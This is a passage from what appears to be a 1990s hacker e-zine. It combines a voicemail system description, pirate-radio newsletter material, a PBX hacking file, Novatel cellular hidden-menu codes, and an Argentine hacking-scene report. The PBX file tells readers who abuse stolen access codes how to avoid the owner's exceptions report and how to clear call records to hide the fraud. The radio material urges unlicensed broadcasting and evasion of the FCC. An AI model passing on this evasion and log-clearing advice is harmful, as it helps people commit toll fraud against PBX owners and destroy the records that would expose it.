     digitizes speech and stores it in buffers of six seconds each (20KB)
  o  Using the control bus, the CPU sets a data bus transfer between the line
     board and file card. The file card decides which drive has the most free
     space and where to wire this message. The six seconds of digitized speech
     is transferred from the line board to the file card. The file card then
     writes the six second segment to the disk. This process continues until
     the caller finishes the message.
  o  The file card updates the user record of the called party by placing 11
     bytes in the mailbox. The 11 bytes define the message location on the
     disk, sender, time, priority, and length.
  o  The caller terminates the call by pressing the one key
  o  The line board informs the CPU through the control bus that the call has
     been terminated
  o  The CPU commands the file card to send the good-bye prompt to the line
     board which converts it to analog and passes it to the TIC
  o  The CPU commands the scanner board to disconnect that port
  o  The scanner board commands the TIC to hang-up (go on-hook) through the
     polling/status control bus
  o  The scanner board continues polling all TIC ports for change of status


CONCLUSION

I hope this information provides you with a more solid background of
how the ASPEN system functions. The basic aspects of this system can also
apply to other similar PBX interfaces. Although the above information
cannot really be used for anything illegal, I have provided it, for
informational purposes, to those who &quot;feed&quot; on telco-bits as I do.

[The following is a message we received from Radio Free Berkeley
 regarding their movement and radio kits.  I think these guys
 have a great thing going, and I personally am taking measures
 to get involved, (in my own special way.)  Now Austin FCC, don&#039;t
 get your sphincters in a tizzy, because you won&#039;t be fining me
 anytime soon, but you never know who that broadcaster is, now do
 you?]

------------------------------------------------------------------------------

Chris,

I have enclosed the most current newsletter from FRB is this email.
Mondo 2000 just came out and has a 14 page article on Guerilla media with
a lot of information about FRB and others.  We are trying to encourage as
many people as possible to obtain transmitters and take to the air
waves.  If this happens, it will be very difficult for the FCC to do very
much, especially in areas of the country where the nearest FCC office is
500 to 1000 miles away.  It is extremely important that the stranglehold
on the free flow of ideas, information, art and culture be broken not
only here but around the world as well.  China has just clamped down on
broadcasting there, only state approved outlets and all satellite dishes
have been banned was well.  We intend on putting an international
shortwave station on the air, first broadcast will be New Years Eve.  It
will be a call for no borders, tear down the walls and party down.  We hope
to get people in the Bay Area who are in exile from their home countries
for political activity to do 10 to 20 minutes programs in their
native language which we will broadcast around the world on the 20 meter
band.  Needless to say, the FEDS and their corporate masters are going to
take a rather dim view of all this.  Their armies and police can not be
everywhere at once, however.

Anyway, good to hear from you.  Let me know if you need further information.

               ***** FCC Uses 20 SF Cops to Obtain ID *****

     In a scene resembling a French noir film, one person associated with
San Francisco Liberation Radio was detained by 20 SF police officers until
his ID could be presented to FCC agent David Doon.  At approximately 9:30
PM on Wednesday, September 22, Richard Edmondson was approached by David
Doon who asked for identification.   After refusing to produce
identification and answer any questions,  Richard drove away and was
stopped on Webster St. by SF police officers who blocked off the entire
northbound lane of the street with 8 vehicles.  A confused scene ensued
wherein the police officers had virtually no idea of what was going on or
why they such massive backup had been called.  Richard was ordered to get
out of his vehicle with his hands up and in clear sight by clearly agitated
SF police who subsequently handcuffed him.  SF police officers were heard
to say &quot;who is this guy&quot; and &quot;what do we have him for&quot; - for several
minutes these questions went unanswered.  By the time the FCC agent arrived
to examine Richard&#039;s ID there were at least 20 SF police officers on the
scene.  After learning of what was going on some of the officers were
clearly exasperated at having their time wasted by this FCC agent.  A few
were amused and asked for information regarding San Francisco Liberation
Radio&#039;s frequency and broadcast schedule.  After Richard&#039;s ID was verified
he was released without any further consequences by the SF police.
     Richard described it this way, &quot;Before it was all over there were at
least 20 police officers on the scene.  They were all so pumped up with
adrenaline you would have thought I had committed the crime of the century.
It was clearly irresponsible for this FCC agent to call for such a massive
response without giving clear reason or instruction to the SF police.  When
police officers go into a situation not knowing the details they naturally
assume the worst.  For one dark moment I feared my life was in danger.&quot;
     Clearly, this was an obvious case of overreaction by FCC agent David
Doon who clearly endangered the life of Richard Edmondson by calling in
such a massive police response.  The FCC must be held accountable for the
actions of their agents who use such extremely excessive and reactionary
methods to suppress a growing micro power broadcasting movement.  It would
have sufficed for David Doon to have written down the license plate # of
Richard&#039;s vehicle and run a DMV check.  As more micro power broadcasters go
on the air in the Bay area and Northern California we can anticipate
further actions by the FCC to harass and intimidate those involved.
However, we shall not be moved by their threats and police state tactics.

           ***** BUSH RADIO UNDER ATTACK IN SOUTH AFRICA  *****

4 October, 1993

AMARC Solidarity Action Network received this urgent demand today
from Bush Radio, a community radio project in Cape Town, South
Africa.

An Action Alert was first issued in support of Bush Radio when its
equipment was seized in May. For a copy of that Alert, send a request
to amarc@web.apc.org.30th September, 1993

OPEN LETTER RE:  PROSECUTION OF BUSH RADIO

To Bush Radio&#039;s Members, Users Friends and Supporters

Bush Radio is being prosecuted for starting a community radio
station. We are charged on three counts:
     1.   illegal broadcasting
     2.   illegal possession of broadcast apparatus, and
     3.   obstructing the course of justice.

These charges are being leveled at two of our members, who face
stiff penalties: R10,000 and/or 3 years imprisonment each on the
first two counts alone.

The first court appearance is set for October 13. We now need
your support to stop the victimization of genuine community radio
before it even gets going.

Bush radio is a community radio initiative, owned and controlled
by its membership, a wide range of organizations and individuals.
For more than two years we planned and talked about going on air.
Our attempts to get a broadcasting license from the Ministry for
Home Affairs were repeatedly frustrated, and our membership
eventually decided that we should go ahead without one.

So from 4 - 8 pm on Sunday April 1993, listeners on the Cape
Flats heard a mix of programs produced and presented by our
&quot;networkers&quot; (volunteer producers from the community). Scores of
other people were there, and all of them had a chance to go on
air, most of them for the first time in their lives.

In the week that followed the state seized our transmission
equipment, effectively silencing us on the eve of our second
broadcast, scheduled for May 1st. About six weeks later we were
warned that the state was considering laying charges against us.
Last week charge sheets were served on our lawyers, to appear
before a regional court on October 13th.

For the state to take such action at this time seems to
contradict their professed commitment to a more open South
Africa. We are being charged in terms of laws inspired by
apartheid at the very same time that new legislation passes
through parliament - including bills for the transitional
Executive Council and an Independent Broadcasting Authority,
drawn up by parties at the negotiations.

The enforcement of these charges could have serious consequences
for us at Bush Radio. For an organization which employs a staff
of only two people, we do a disproportionate amount of work, and
can ill afford to be spending time on defending unnecessary legal
action. Bush Radio runs a range of training programs aimed at
bringing new voices into the broadcasting environment. We work
with a number of organizations, producing programs that are
distributed either on audio-cassette or on other radio stations.
Substantial time and energy is invested in building up a network
of volunteers, the backbone of a truly participatory community
radio. A lot of time is spent providing support to others who
want to start radio stations in their own communities.

Despite our modest resources, Bush radio has become something of
a &quot;flagship&quot; for the emerging community radio sector in SouthAfrica.
For us to be criminalized could weaken the growth of this
new sector which holds such real potential for communities
wanting to control their own development.

We were always open and peaceful in our methods, and feel that
this treatment is misplaced. To drag us through the courts is a
waste of time and money, not only for Bush Radio but also for the
taxpayer who foots the bill.

We hope the charges might be dropped, and seek your support in
making our case. What can you do?

At this stage we ask that you write letters. They should be:
     &quot;To whom it may concern,&quot;

The content of your letter would depend on your relationship with
Bush Radio.

If you are a member, we&#039;d like you to say why you think it&#039;s
inappropriate for us to be prosecuted, and include a statement of
solidarity.

If you are a client, we&#039;d like you to say why you think it&#039;s
inappropriate for us to be prosecuted, and include a statement of
solidarity.

If you are a client, we&#039;d like to hear about the value of service
you have derived from Bush Radio, and we would like you to be
specific about what we did together.

If you are a friend, or supporter, please write whatever you feel
is appropriate, and we&#039;d appreciate comments on how this kind of
action undermines confidence in the nature of change in our
country.

Please send these letters to:
                     BUSH RADIO at fax no.:
                        +(27-21) 448-5451

                   ***** FREEDOM OF COMMUNICATION *****


&gt;From Zeke Teflon&#039;s book - Complete Manual of Pirate Radio

     Freedom of communication is a basic human right. Like all rights,
freedom of communication consists of being able to exercise your
abilities with- out interference. Government cannot give you your
abilities, but it sure as hell can (and will) interfere with you when
you exercise them. Government cannot give you rights. It can only
take them from you. If all governments (goons with guns forcing others
to follow their dictates through violence and coercion) were to
cease to exist, human rights would certainly not cease along with
them.

     The naive objection could be raised that while governments cannot
give you rights, they can protect them by preventing your fellow citizens
from interfering with you. That&#039;s the theory. In practice, governments
rarely &#039;protect&#039; citizens&#039; rights, and then only when it suits their
political purposes. Invariably, when governments feel the least
bit threatened, they place their own &#039;security&#039; needs above the human
rights they supposedly safeguard. Through- out history the vilest
and most consistent violators of human rights have been governments.
Governments, along with their bedfellows, organized religions, have
been responsible for the overwhelming bulk of human rights violations
in every human civilization.

     We cannot look to government to protect our rights. We have to do
it ourselves, and an effective means of doing that is by exercising
our rights. Use &#039;em or lose &#039;em.

                     ***** Connecting to the Net *****

     One of the best tools for the immediate transfer of news, information
and discussion is the Internet.  With any basic computer and a modem, world
wide access is just a few keystrokes away.  In the Bay Area one of the best
Interest access providers is CRL, for a flat rate of $18 per month you will
have all the Interent resources available to you.  Resources include the
ability to send email to anyone else in the world who is on the net as
well, check out hundreds of news groups for the latest and weirdest
happenings, send breaking news and information to other community
broadcasters, etc.
     At the moment we are working on a way to digitally record and compress
5 to 15 minute audio spots into a computer file which can be sent anywhere
in the world where there is a computer to receive it.  With an inexpensive
digital recording and playback card which plugs into any basic PC system,
micro power broadcasters will be able to send and receive these spots to
and from anywhere in the world.  This completely bypasses the rather
expensive satellite feeds and makes for a much more decentralized system of
distribution.  If you are interested in this project please contact us.

      ***** MICRO POWER BROADCASTING, TECHNOLOGY FOR THE PEOPLE *****

     With circuit board dimensions of 2&quot; x  4 1/2&quot;, a five
watt FM micro power transmitter is capable of covering a community
3-5 miles in radius.  Such compact and inexpensive technology has
the possibility of giving each and every community its own voice.  Stephen
Dunifer with Free Radio Berkeley has been designing and developing
this unit along with a series of other transmitters, amplifiers and
antennas over the last year.  Mass produced RF transistors and
communications IC&#039;s have made it possible to design and build stable and
clean transmitters and amplifiers for a fraction of the cost of brand name
type accepted equipment.  Even the entry level 5 watt kit, using only three
transistors, is very stable once tuned and set up.
     Even more sophisticated phase lock loop (PLL) frequency
control designs are not that much more expensive to design and produce.  At
this moment, several individuals are working on low cost PLL designs
which should meet current FCC requirements for frequency stability.  When
these designs are finished they will be available in kit form and
assembled as well (for shipment outside US only).
     What does it take to put a micro power broadcasting operation
on the air ?  First off, less than $500.  A basic 5 watt FM transmitter,
output filter (very necessary to reduce output harmonics), coax cable
(50-100 ft RG8), antenna and power supply (battery or 12 volt regulated
and filtered unit) is going to cost about $125-150.  This is assuming
assembly of kit and antenna.  Next, a VHF power meter ($30-$40 at
Radio Shack), a dummy load (make from resistors or $19 at Radio Shack)
and a frequency counter ($50-150) are needed for tuning and keeping
things optimized.  Beyond those requirements one sort of audio source
(line level -10 dbm, .3 volts) or another is needed to feed the
transmitter.  This source can be a walkman type cassette unit, a mixing
board, tape deck, etc.  Granted this is not a professional studio but for
low budget community operations, it does not take top end gear.  Creativity
and determination as shown by many community stations can certainly make
up the difference.
     Once all the equipment has been assembled and arranged,
a suitable place needs to be found for the operation and setting up
the antenna.  With FM, which is line of sight transmission, the higher
the antenna the better.  Depending on the regulations and political
climate of the country in which you live, your operation may need
to be portable for rapid set-up and break down.  That seems especially
true here in the United Corporate Snakes of America.
     At the core of this is the potential to set up loosely
coupled autonomous networks of communication around entire planet,
outside the grasp of corporate/government control.  This is the goal
of the Free Communications Coalition, the umbrella organization which
is being formed to support, defend and encourage micro power broadcasting.
     Micro power technology makes this possible through a
combination of low power. inexpensive FM, AM, TV and shortwave
transmitters.  Free Radio Berkeley, San Francisco Liberation Radio and
other interested parties will be placing an international shortwave station
on the air (100-300 watts initially at 40 meters -  7.4 to 7.5 Mhz range,
increasing to 1000) sometime in November, 1993.  If we had to use
tube designs, doing such an operation would be impossible due to the
portability requirements.  Instead, relatively inexpensive transistor
designs allow to us build linear shortwave amplifiers capable of output
powers exceeding 1000 watts while running off a bank of lead acid
batteries.  Certainly, within the normal definitions, 100 to 1000
watts on shortwave is definitely beyond the usual micropower definition.
However, when right wing evangelical ranters are running 100-500 KW it
could be considered to be micropower. At the moment, Free Radio Berkeley is
offering an entire line of transmitter and amplifier kits for FM
broadcasting along with antenna and equipment designs.  Assembled
units are available for sale outside the US only.  A rather effective
antenna can be built using common hardware store parts for about $10.  Our
work will be expanding to include UHF &amp; VHF TV, AM and shortwave designs.
     We would like to find other engineers and technically
inclined people to help increase these efforts since we are a rather
small design and development operation.  Further, we need such technically
inclined people to act as advisors and facilitators in the process
of helping people build, test, tune, and setup their transmitters
and antennas.  That way, we can create a pool of people across the
country and world who will be available to lend a technical hand to
those who wish put micropower broadcasting operations on the air.

Let a thousand transmitters bloom

                     Freedom of Broadcasting in Italy

     Just for you to know, back in 1974/75 Radio Milano International in
Milano (not associated with us) started as the first private-pirate
FM station in this country, operating from a van which kept moving
around the town to avoid the PTT authorities (equivalent of the FCC).
RMI brought the first regular stereo programs to Italy, good music
not heard before on state channels, as the other stations which came
after them did. They also went to court and fought for &quot;free&quot;, private
radio and freedom of speech over radio and won against the old Postal
law which considered broadcasting as State Monopoly. Today RMI is
one of the major national radio networks with hundreds of repeaters
all over the Italian peninsula, while thousands of private radio and
TV stations obtained authorizations to broadcast legally over the
years.
     If you have a story to tell on pirate radio, or information to share
(voice/paper/email), please get in touch with us. On shortwave we reach
also many European Pirates who would love to hear from you. (We indeed
carried &quot;legally&quot; some of the pirates programs in the past in order
to offer them better coverage to their &quot;alternative&quot; programs. Something
we would also like to do again the future.)

Please send email to 100020.1013@compuserve.com, including a phone
number and times when we can call possibly you from Europe for an
interview. We will guarantee anonymity if so desired, since our Shortwave
transmissions may also be heard in the USA. We&#039;ll love to hear from
you! 73, Alfredo --- Alfredo E. Cotroneo, President, NEXUS-International

Notes from the Net on the FCC

One person writes about his FCC bust on the Usenet newsgroup
alt.radio.pirate:

When I was busted in 1984, the FCC used a tan-colored
buick passenger car.  The passenger seat had been ripped out and was
replaced with a rack of receiving equipment--nothing special, just
commercially-available stuff.  In the trunk was a pair of batteries
driving inverters.  The engine had a second alternator to charge the
batteries.  Beneath the vinyl roof was a direction-finding antenna
array that was connected to an indicator on the dashboard.  They&#039;d
just drive in the direction indicated until they reached the transmitter.
     That car served 3-4 states in the Northwestern US.  How
do I know all this?  After the guy finished writing me up, I asked
him to show me his equipment.  After all, I showed him mine.  He started
to say no, but then changed his mind since there was nothing secret
involved.

Don Hackler responds:

     When I was engineering an directional AM broadcast station,
the station was inspected by two FCC engineers driving a similar car.
The roof had been removed and replaced with a fiber glass replica
of the original.  The antennae were embedded in the new roof, and
there were no indications of anything `special&#039; about the roof, inside
or out.
     I was given a ride in the car to go check some of the
monitor points with a field-strength meter.  The passenger bucket
seat had been replaced by a 3 foot tall rack on a swivel mount, so
the driver or a passenger in back could operate the equipment.  The
rack had a slip cover made of upholstery vinyl that matched the car&#039;s
interior.  They refused (nicely) to let me see the equipment, but
said it was just standard equipment; i.e. a spectrum analyzer and
some general coverage receivers.
     I never understood why they didn&#039;t allow a peek, but
I assumed it was probably some policy they were following.  That was
my first, and so far only, FCC inspection.

             ***** Why Support Micro-Power Broadcasting? *****


     Number One:  The issue is freedom of speech.  It&#039;s truly
shocking what the Federal Communications Commission has allowed to
happen. Media access is becoming too restricted for regular people
to get their message across.  As each day passes,  radio, television,
and newspaper media gets gobbled up pac-man style by big outfits like
Sony/CBS, GE/NBC, ATT,  ABC, Time-Warner Communications, Hearst, Gannett,
Disney, Ted Turner, or even Fox.  Our local media mogul, James Gabbert,
owns an AM, FM, and television station in the same area.  Middle America
gets bombarded with religious broadcasters and urban areas get millions
of watts of commercial crap beaming out from huge towers.  Arbitron
and Neilson decide which stations have what percentage of the listening
audience.  This situation must be changed so that truly free communication
can have a chance to survive.  In the 90&#039;s we need some space on the
broadcast bands for community radio and television.  Cable TV is promising
hundreds of channels to choose from, but most of this stuff will be
generated by the existing media networks.  The problem here is that
minority opinions are not heard.  Censorship can not be tolerated
in a democratic society.  Freedom of information is what we need.
     Number Two:  The technology has changed.  It used to be very expensive
to run a radio station.  With modern electronics, however, small radio
stations can be on the air with a minimal investment.  In fact, people
in Japan have been doing micro-power broadcasting  for years.  Most
people in the U.S. just have AM, FM, and TV receivers.  To reach these
people, you usually have to buy advertising time on a commercial station.
That&#039;s assuming some station is willing to broadcast your tape!  What we
want is true public access to the airwaves for everyone, not just
the rich and powerful.  The cloud of secrecy about broadcasting has
lifted and now we know that media power has been stolen by our own
government,  and sold to the highest bidder.  People need media access
because human beings have a natural need to communicate with each
other.   Cable TV and Audio service should feature input from the
community at large.  The old concept of standing on a soap box and
calling out to your fellow citizens will not work in the computer
age.
     Number Three:  Health Concerns about Radio energy, in large doses,
it is considered by some to be a real health hazard. Incidence of
leukemia and cancer runs high among men who work on high power transmitting
towers.  People in San Francisco get blasted with literally millions
of watts of energy coming from Sutro Tower.  This is because some
radio and television stations want to be picked up 100 miles away.
Scientific opinion on the effects of exposure to radio waves varies quite a
bit, but if you&#039;re one of those people living up near Sutro Tower, maybe
you should move.  Micro-power is the sane way to use radio and tv.  The
space on the radio and tv dial should be spread around to all interested
parties, not just a small group of companies.  Broadcast power levels
for all stations should come down to safer levels.

of SFLR, author of that slogan, said, &quot;Well, first and foremost of all it
seemed like a truism, and it seemed like the sort of phrase to end a radio
program with - catchy.&quot;
     Stephen Dunifer with Free Radio Berkeley added, &quot;Yes, but cockroaches
do not carry guns&quot;.  One of Free Radio Berkeley&#039;s favorite tag lines is
&quot;Are you going to continue to live the lie or are you going to act the truth
?
     Both San Francisco Liberation Radio and Free Radio Berkeley have been
carrying a lot of very diverse and interesting programming ranging from
Food Not Bombs Radio Network programs to Jello Biafra declaring that

     Within the last few months, a considerable amount of media attention
has been focused on Micropower Broadcasting.  Articles have appeared in the
East Bay Express, SF Weekly, Bay Guardian, Oakland Tribune, San Jose
Mercury, Daily Cal, SF Chronicle, Berkeley Voice and New York Daily News.
CNN put together a  news story about Free Radio Berkeley which aired
nationally and was picked up and rebroadcast by Channel 2 in Oakland.
     More coverage is expected to be forthcoming.  An article may appear in
the New York Times.  KQED radio is working on a story.  A fifteen page
article on guerilla media will be in Mondo 2000, due out the first of
November.  Channel 31 (Marin County) is covering one of the broadcast
operations in San Rafael.  A press and info packet is going to be sent out
around the country.  Any help you can offer in the area of community and

                  FREE COMMUNICATIONS COALITION MEETING

Saturday, November 13 - 5 PM
809 B Allston Way, Berkeley

     With the dramatic increase in publicity (Free Radio Berkeley made the
front page of the Sunday New York Times - Oct. 24) and response we have
experienced in the last month or so, it is rather important that all of us
who are concerned with the defense, support and promotion of micro power
broadcasting come together to plan and create a strategy which will lead to
the Free Communications Coalition (the Peoples&#039; FCC) becoming an
international umbrella under which micropower broadcasting can flourish.

     To that end, you are invited to attend the meeting of the Free
Communications Coalition on Saturday, November 13 at 5 PM.  It will be held
at 809 B Allston Way (between 5th &amp; 6th streets) in Berkeley.  This will be
a pot luck dinner meeting, bring a vegetarian dish to share.  Following, at
8PM will be a video benefit, see above for further details.

Greetings from myself, The Evil [)r. [)elam!

In this text file I present a PBX that identifies itself as an &quot;MCX7700&quot;...
probably the easiest PBX hack you&#039;ll find, and not a bad system... I&#039;ve seen
worse.



Dis&#039;-claimer: (This is the part where I get to Dis&#039; the system.)
-------------
This particular system is wide open and it&#039;s not my problem the owners
decided to buy a lame system.  Via freedom of the press I am publishing
my findings, so if anyone gets pissed off about this file *PHUCK 0FF*!



Ab-Using the system:
--------------------
Once a data connection is established, press the &#039;*&#039; key to enter
programming mode.  In programming mode, all commands are given as 2 digit
combinations.  Some of the commands are macros of other commands. Example:
command 50 will do a command 15 plus enter a response to the question &quot;Clear
all call records Yes/No&quot;.  This particular system uses only extensions..
not accounts, but has the capability to do both.  The system sends EOF
(CTRL-Z) characters after every command, this is NOT something I typed.
I replaced all occurrences of CTRL-Z characters with &lt;-CTRL Z-&gt; in this phile
for obvious reasons.



Note to |&lt;odez |&lt;iddiez:
------------------------
For all you kiddiez who think you can bang the fuck outta codez and never
get caught, you might think again after reading this phile.  Command 55
&quot;Exceptions report&quot; is most likely what the system owner looks at every
month.  The report includes Most Expensive Calls, Longest Calls, and Most
Frequently Called Numbers.  Avoiding being caught is as simple as hiding
among the rest of the crowd. I.E. don&#039;t fucking call Japan or stay on for 8
hours, and don&#039;t call the same BBS 100 times on a code in a month.  The
administrator most likely will glance at the printout and see which
department has a fuckup in it who calls his mistress in Egypt every day, and
go rag him out... if you&#039;re not one of the top in the exceptions report,
chances are they&#039;ll never know.  If you happen to have the dataline to the
PBX then who the fuck cares.. just clear the fucking call records.

Ending notes:
-------------
I&#039;ve had this system laying around for the past 2 years and never gave a
flying fuck about it, yet when I find new systems I am unfamiliar with I
always wonder why the hell no one writes a phile on &#039;em to pass on the
knowledge.

Anyway, to all who have hacked not-so-well-known systems, or even something
you consider lame, WRITE A PHILE ON IT!!  If enough people start doing this,
a newz letter could be started.. call it LSD (Lame Systemz Digest) or
something.  Woa, what a concept!

The Novatel 8325 is a bag-style portable cellular telephone. It is known as a
&#039;ProClassic&#039; in Novatel MarketSpeak. Two different handsets (control units) are
used with the 8325 transceiver: the 4130 and 5160. My phone has the 5160.
The handsets appear very similar: I doubt there is any functional difference
between them. Earlier transceivers, such as the 8320, contain many of the same
features as the 8325, though the hidden menus are accessed with different
codes. The only other code I know of is #746, which is the code for the 8320
CFG menu.

Terms: Throughout this article, I will refer to things without explaining them
each time. If you get lost, refer to the table below.

NORMAL = the phone is in this mode when it is not locked, or in either of the
hidden menus, or in the &#039;user&#039; menus accessed by the MENU key. The screen will
display either READY or SCANNING when in normal mode. This is the mode the phone
is in when it is first turned on.

LOCKED = when the phone displays LOCKED, a code must be typed to enter normal
mode. The default code is 1234. The telephone can be locked using [FCN] 1 [SND]
from normal mode. The phone must be locked before entering in any of the codes
to access the hidden menus described below.

TBL = troubleshooting mode = the hidden menu accessed with 546*. This is a
menu supposedly know only to Novatel, not even their dealers are supposed to
know about it. According to Novatel, some of the features in this menu could
destroy the phone if improperly set. Scare tactics? You decide.

CFG = configuration mode = the hidden menu accessed with 510*. This is used by
dealers to set up a subscriber&#039;s service. As far as I know, there is nothing
particularly dangerous about this mode, but Novatel is touchy about it
nonetheless. I take no responsibility for any damages.


Troubleshooting Mode - TBL

First, lock phone with [FCN] 1 [SND]
Then, enter 546* on the keypad. The phone
will not make tones for each key pressed.

TBL 8325    /___ This is what shows up on my phone.
REV NA0C    \    Yours may be different.

You are now in troubleshooting mode. You may page through the functions
by using the arrow keys, or access the functions by number, by hitting #
(The screen will display DIR PAGE ACCESS) and then the function number,
from the chart below. Note that on initially entering Troubleshooting mode,
you are on function 37. Toggle with the [SND] key, unless otherwise noted.

                             International Scenes

There was once a time when hackers were basically isolated.  It was
almost unheard of to run into hackers from countries other than the
United States.  Then in the mid 1980&#039;s thanks largely to the
existence of chat systems accessible through X.25 networks like
Altger, tchh and QSD, hackers world-wide began to run into each other.
They began to talk, trade information, and learn from each other.
Separate and diverse subcultures began to merge into one collective
scene and has brought us the hacking subculture we know today.  A
subculture that knows no borders, one whose denizens share the common goal
of liberating information from its corporate shackles.

With the incredible proliferation of the Internet around the globe, this
group is growing by leaps and bounds.  With this in mind, we want to help
further unite the communities in various countries by shedding light
onto the hacking scenes that exist there.  If you want to contribute a
file about the hacking scene in your country, please send it to us
at phrack@well.com.

This month we have files about the scenes in Argentina, Australia and Greece.

                Argentina: Hacking at the ass of the world
                ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                               by: OPii.

  Yeah, i know, it&#039;s something you just can&#039;t stop, whenever you try to sleep
  that recurrent idea comes and recurses through your very brain, you are
  blind, it happens to be worse than MTV, you just can&#039;t get to sleep, you stay
  up for hours, you forget to feed yourself, you can&#039;t even remember your name,
  you turn catatonic, you stand still stretching every nerve and mumbling
  &quot;hhmmpff..sc.eenn...arghh..teennn..ahhh...&quot; and then you explode in a
  terrifying scream...

    &quot;ARRRGHHHHHH, WHAT THE FUCK IS GOING ON IN ARGENTINA??????&quot;


  Right?

  NO????

  Well, I never really thought that could happened but I&#039;m gonna answer
  the question anyway, I know you probably don&#039;t give a fuck about Argentina
  and it&#039;s scene but, hey, reading shitty text files is not new to you so
  you wanna change your habits RIGHT NOW? Nahhhhhhhh

Introduction
~~~~~~~~~~~~
  Ok, enough is enough, so let&#039;s get to the point.

  Argentina is lagging. While other countries are flying toward the hyper
  publicized &quot;Data Highway&quot;, Argentina is still trying to fork it&#039;s path in
  the telecommunication&#039;s jungle. And this has it&#039;s pros and cons.

  Before 1990 the telecommunications in Argentina were in hands of Entel,
  the government&#039;s monopolistic arm that ruled the area. But, and there&#039;s always
  a BUT, the service provided by Entel was worse than bad. For too many
  people it was normal to wait YEARS for a line, paying $1000+ when they
  finally got it installed, and then a never-ending nightmare began,
  if it rained, the line went dead, if it didn&#039;t die it went crazy, you
  could pick up the phone and listen to your favorite radio station but
  of course you could not call anyone. Or you could had bizarre conferences
  with persons you&#039;d never met...it was basically POTS but with features
  that Entel never thought about... N-way calling, call forwarding to hell,
  continuous call waiting in the form of line noise, speed dialing to always
  busy DNs...

  Ahh, you could get a line in less than a month if you paid the $1000
  to some bogus vapor-companies whose workers would came pulling loops out
  of their sleeves and installing them quietly (yeah, all completely illegal),
  these companies were known as the phone mob.
  Remember, Entel was the ONLY company entitled to give you not only a phone
  line but the phone itself.

  And the bills... the bills always had an encrypted message in them, you needed
  a PhD in Black Magic in order to decipher what the fuck the telco was
  charging you... but for most mortals the meaning was only one:
  PAY, pay whatever we order you to pay, and don&#039;t ask why.

  You made only local calls? PAY! (local calls are not free in Argentina)
  You didn&#039;t make that call to Nairobi, Kenya? PAY!
  Ohh, but you cant dial outside the country with your line? PAY ANYWAY!
  You want to complain? PAY FIRST!

  In 1990 the government decided to split Entel in two companies and sell them
  to private investors, each company would service either the northern or
  southern Argentina, the border being Buenos Aires&#039; downtown (in case you
  don&#039;t know Buenos Aires is the capital of Argentina).

  This was nothing more than giving the monopolistic Entel to two new
  monopolistic companies as we will see.

  So the government sold Entel and two new companies appeared in Argentina&#039;s
  communications scene:

 - Telefonica de Argentina. Servicing the southern part of Argentina, this
   company is formed by the Spanish Telefonica de Espaa (owned by Spanish gov.)
   and several Argentinian and foreign investors.
 - Telecom Argentina. Services the northern Argentina and it&#039;s major
   stockholders are France Telecom and STET (Italy).

  Also, another two companies where born:

 - Telintar. Owned by Telefonica and Telecom. The ONE AND ONLY LD carrier
   in Argentina.
 - Startel. Guess who owns it? Yeah, Telefonica and Telecom, with some
   philanthropic aides like Citicorp, J.P. Morgan and Techint and Perez
   Companc ( Argentinian megacorps). Startel provides TELEX and data
   transmission services as well as mobile and sea radio links. It runs
   the most known Argentinian X.25 PSN (ARPAC).

  The government however had to assure minimal control of the companies
  and verify that their procedures and actions conform to the Argentinian
  laws. That&#039;s the duty of the SNC (National Communications Secretary) and
  the CNT ( National Telecommunications Commission), the last being some
  sort of mirror image of the American FCC.

  Did anything changed with the appearance of Telefonica and Telecom?
  Did the customers noticed an improvement in the phone service?

  Both companies began to &quot;correct&quot; Entel&#039;s mess rapidly but personally
  I consider it was a little more than nothing for the customer.
  They did change loops, trunks, switches, added features, installed
  inter-office fiber links, private PSNs and more. But, it&#039;s 1994
  now, and I still know zillions of persons that had their line dead
  for 4-5 months, or have been visiting the telco offices everyday
  during a month complaining about line_noise/no_dial_tone/
  dial_tone_but_no_dialing/cant_receive_calls/cant_dial_certain_NPAs/
  bills_are_way_out_of_scope/etc.

  To conclude this section I will only say that:

   1). There&#039;s still a telecom. monopoly in Argentina, now in the form
       of two private companies.
   2). Service got better but it&#039;s still a mess, dirty and expensive.
   3). Both companies enjoyed an explosive economic grow since 1990, their
       shares being one of the best things you could get a hold of in the
       stock exchange.

The Phony Phone System
~~~~~~~~~~~~~~~~~~~~~~

  Argentina uses pulse dialing, except for those lucky persons that
  have the latest installed switches in their COs. If you don&#039;t have
  DTMF you HAVE TO ask for it, you can do this dialing 112 (Telecom)
  or visiting the office (Telefonica and/or Telecom). Someone will
  eventually listen to you and answer:
    1) &quot;Uh???? What&#039;s DTMF?&quot; - Forget it, ever considered teaching algebra
                               to a chimpanzee?
    2) &quot;I&#039;m sorry you can&#039;t dial MF with that line&quot; - No luck
    3) &quot;Not a problem, we&#039;ll set it for MF&quot;         - You bastard!


  Switches are Step by Step or Crossbars but since 1990 the number of
  electronic, and specially, digital switches has increased constantly.
  Both, Telecom and Telefonica, use equipment from many different
  vendors: Siemmens, Ericsson, Hitachi, Fujitsu, Northern Telecom, AT&amp;T,
  Alcatel, NEC, Spanish companies, Italians, Norwegians, and God only knows
  what else. Most switches are either European or Japanesse.
  As for PBXs, Siemmens, Ericsson and Fujitsu are the brands of choice for
  most companies, with the recent grow of NT&#039;s Meridians among large
  corporations.

  DNs are 7 digits but still 6 digits in low line density locations,
  this includes certain areas in Buenos Aires, the capital. Generally, 6
  digit DNs can&#039;t complete an international call for themselves, they need
  operator assistance ( DDI is the &quot;feature&quot; that allows a subscriber
  to make international calls without operator&#039;s assistance, geez). Other
  features offered are 3-way, conference, call forwarding, call waiting
  (can&#039;t be fucking disabled temporarily!) and more. Telecom also offers a
  service called &quot;Factel&quot;  which is a detailed list of all the calls you made
  in a billing period  (2 months), this comes  with your bills and they
  charge you for EACH PAGE.

  LOCAL CALLS ARE *NOT* FREE.

  Toll free numbers (800) where introduced two years ago but so far there are
  few 800s to call, one of the few is the CNT&#039;s 800 for reception of
  complains about the telco&#039;s service.

  Both Telefonica and Telecom use Frecuency Division Multiplexing (FDM) or
  Time Division Multiplexing (TDM) for grouping channels with a bandwidth
  of 4KHz into a multiplexed signal, called Base Band, of several channels.
  Analog and digital multiplexing is used depending on the equipment
  installed.

  The hierarchy of groups is as follows:

  - Primary Group or Basic Group: 12 4KHz channels for a total bandwidth of
    48Khz, generally placed in the 60-108 KHz space.
    There are three ways for forming a Basic Group: Direct Modulation,
    Pre-group Modulation or Premodulation, I won&#039;t discuss &#039;em in this
    article.
  - Secondary Group (aka Super Group): 5 Primary Groups (PG) for a total of
    12x5 = 60  channels and a 240KHz bandwidth., placed in 312-552KHz band
  - Master Group (MG): 5 SGs, 60x5 = 300 channels, 1232 Khz. bandwidth
